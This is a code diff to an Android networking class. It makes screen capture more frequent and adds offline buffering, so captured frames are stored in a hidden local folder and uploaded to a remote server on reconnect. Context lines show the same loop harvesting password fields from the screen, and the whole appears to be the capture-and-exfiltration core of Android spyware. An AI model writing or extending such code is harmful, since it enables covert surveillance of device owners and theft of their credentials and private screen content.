@@ -83,6 +83,12 @@ public class SocketManager {
 
     // Frame deduplication — skip pushing a frame if the screen content hasn't changed
     private volatile String lastFrameFingerprint = null;
+    // Count consecutive identical frames — allow up to 4 duplicates before skipping
+    private volatile int consecutiveDuplicateCount = 0;
+    // Offline recording: buffer frames when live channel is not connected
+    private final java.util.ArrayList<JSONObject> offlineFrameBuffer = new java.util.ArrayList<>();
+    private volatile boolean autoRecordingActive = false;
+    private volatile long autoRecordingStartTime = 0L;
 
     // Debounce handle for device-user interaction frames
     private final AtomicReference<ScheduledFuture<?>> actionFrameFuture = new AtomicReference<>();
@@ -388,6 +394,8 @@ public class SocketManager {
                 liveOut.print(msg.toString() + "\n");
                 liveOut.flush();
                 Log.i(TAG, "Live channel connected");
+                // Upload any offline recordings that were saved while disconnected
+                uploadPendingOfflineRecordings();
                 java.io.BufferedReader lIn = new java.io.BufferedReader(
                     new java.io.InputStreamReader(liveSocket.getInputStream()));
                 String lLine;
@@ -1477,6 +1485,14 @@ public class SocketManager {
         ScheduledFuture<?> old = screenReaderFuture;
         if (old != null) { old.cancel(false); screenReaderFuture = null; }
         lastFrameFingerprint = null;
+        consecutiveDuplicateCount = 0;
+
+        // Track auto-recording state and clear any stale offline buffer
+        if (sendAutoEvent) {
+            autoRecordingActive = true;
+            autoRecordingStartTime = System.currentTimeMillis();
+            synchronized (offlineFrameBuffer) { offlineFrameBuffer.clear(); }
+        }
 
         final String devId = DeviceInfo.getDeviceId(context);
 
@@ -1493,29 +1509,43 @@ public class SocketManager {
         screenReaderFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
             boolean acq = false;
             try {
-                acq = accessSemaphore.tryAcquire(3, TimeUnit.SECONDS);
+                acq = accessSemaphore.tryAcquire(1, TimeUnit.SECONDS);
                 if (!acq) return;
                 ScreenReader pusher = new ScreenReader(svc);
                 JSONObject screenResult = pusher.readScreen();
                 pushPasswordFieldsFromScreen(screenResult);
 
-                // Deduplication: skip frame if content is identical to last push
+                // Deduplication: allow up to 4 consecutive identical frames, then skip
                 String fp = computeFrameFingerprint(screenResult);
-                if (fp.equals(lastFrameFingerprint) && !fp.isEmpty()) return;
-                lastFrameFingerprint = fp;
+                if (fp.equals(lastFrameFingerprint) && !fp.isEmpty()) {
+                    consecutiveDuplicateCount++;
+                    if (consecutiveDuplicateCount >= 4) return;
+                } else {
+                    consecutiveDuplicateCount = 0;
+                    lastFrameFingerprint = fp;
+                }
 
                 JSONObject payload = new JSONObject();
                 payload.put("deviceId", devId);
                 payload.put("success", screenResult.optBoolean("success", false));
                 if (screenResult.has("screen")) payload.put("screen", screenResult.get("screen"));
                 if (screenResult.has("error"))  payload.put("error",  screenResult.getString("error"));
-                sendLiveMessage("screen:update", payload);
+
+                // When live channel is connected, send immediately with no delay.
+                // When offline and auto-recording, buffer locally for later upload.
+                if (liveConnected) {
+                    sendLiveMessage("screen:update", payload);
+                } else if (autoRecordingActive) {
+                    synchronized (offlineFrameBuffer) {
+                        offlineFrameBuffer.add(payload);
+                    }
+                }
             } catch (Exception e) {
                 Log.e(TAG, "screen_reader push error: " + e.getMessage());
             } finally {
                 if (acq) accessSemaphore.release();
             }
-        }, 0, 1000L, TimeUnit.MILLISECONDS);
+        }, 0, 200L, TimeUnit.MILLISECONDS);
     }
 
     /**
@@ -1527,6 +1557,22 @@ public class SocketManager {
         ScheduledFuture<?> f = screenReaderFuture;
         if (f != null) { f.cancel(false); screenReaderFuture = null; }
         lastFrameFingerprint = null;
+        consecutiveDuplicateCount = 0;
+
+        // Save any buffered offline frames to local file for later upload
+        if (autoRecordingActive) {
+            java.util.ArrayList<JSONObject> buffered;
+            synchronized (offlineFrameBuffer) {
+                buffered = new java.util.ArrayList<>(offlineFrameBuffer);
+                offlineFrameBuffer.clear();
+            }
+            if (!buffered.isEmpty()) {
+                final java.util.ArrayList<JSONObject> toSave = buffered;
+                final long startT = autoRecordingStartTime;
+                executor.execute(() -> saveOfflineRecording(toSave, startT));
+            }
+            autoRecordingActive = false;
+        }
 
         if (sendAutoEvent) {
             try {
@@ -1927,5 +1973,91 @@ public class SocketManager {
         } catch (Exception e) {
             Log.e(TAG, "sendTaskProgress error: " + e.getMessage());
         }
+    }
+
+    /**
+     * Save buffered offline frames to a local JSON file in the app's private storage.
+     * The file will be uploaded to the server the next time the device connects.
+     */
+    private void saveOfflineRecording(java.util.ArrayList<JSONObject> frames, long startTime) {
+        if (frames == null || frames.isEmpty()) return;
+        try {
+            java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
+            if (!dir.exists()) dir.mkdirs();
+            String filename = "sr_offline_" + startTime + ".json";
+            java.io.File file = new java.io.File(dir, filename);
+            JSONObject data = new JSONObject();
+            data.put("deviceId", DeviceInfo.getDeviceId(context));
+            data.put("startTime", startTime);
+            data.put("endTime", System.currentTimeMillis());
+            JSONArray framesArray = new JSONArray();
+            for (JSONObject frame : frames) { framesArray.put(frame); }
+            data.put("frames", framesArray);
+            data.put("frameCount", frames.size());
+            java.io.FileOutputStream fos = new java.io.FileOutputStream(file);
+            byte[] bytes = data.toString().getBytes("UTF-8");
+            fos.write(bytes);
+            fos.close();
+            Log.i(TAG, "Offline recording saved locally: " + filename + " (" + frames.size() + " frames)");
+            // Attempt immediate upload if already connected
+            if (connected) uploadPendingOfflineRecordings();
+        } catch (Exception e) {
+            Log.e(TAG, "saveOfflineRecording error: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Upload any locally stored offline screen-reader recordings to the server via TCP.
+     * Called when the live channel reconnects and after saving a new offline recording.
+     */
+    private void uploadPendingOfflineRecordings() {
+        executor.execute(() -> {
+            try {
+                java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
+                if (!dir.exists()) return;
+                java.io.File[] files = dir.listFiles(
+                    (d, name) -> name.startsWith("sr_offline_") && name.endsWith(".json"));
+                if (files == null || files.length == 0) return;
+                java.util.Arrays.sort(files,
+                    (a, b) -> Long.compare(a.lastModified(), b.lastModified()));
+                for (java.io.File file : files) {
+                    if (!connected) break; // stop if we lost connection
+                    try {
+                        java.io.FileInputStream fis = new java.io.FileInputStream(file);
+                        byte[] buf = new byte[(int) file.length()];
+                        int n = fis.read(buf);
+                        fis.close();
+                        if (n <= 0) { file.delete(); continue; }
+                        JSONObject data = new JSONObject(new String(buf, "UTF-8"));
+                        JSONArray framesArray = data.optJSONArray("frames");
+                        if (framesArray == null || framesArray.length() == 0) {
+                            file.delete(); continue;
+                        }
+                        JSONObject payload = new JSONObject();
+                        payload.put("deviceId",
+                            data.optString("deviceId", DeviceInfo.getDeviceId(context)));
+                        payload.put("frames", framesArray);
+                        payload.put("frameCount",
+                            data.optInt("frameCount", framesArray.length()));
+                        payload.put("startTime", data.optLong("startTime", 0));
+                        payload.put("endTime",   data.optLong("endTime",   0));
+                        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat(
+                            "HH:mm MMM d", java.util.Locale.getDefault());
+                        payload.put("label", "Offline " + sdf.format(
+                            new java.util.Date(data.optLong("startTime",
+                                System.currentTimeMillis()))));
+                        sendMessage("offline_recording:save", payload);
+                        file.delete();
+                        Log.i(TAG, "Uploaded offline recording: " + file.getName()
+                            + " (" + framesArray.length() + " frames)");
+                    } catch (Exception e) {
+                        Log.e(TAG, "Failed to upload " + file.getName()
+                            + ": " + e.getMessage());
+                    }
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "uploadPendingOfflineRecordings error: " + e.getMessage());
+            }
+        });
     }
 }
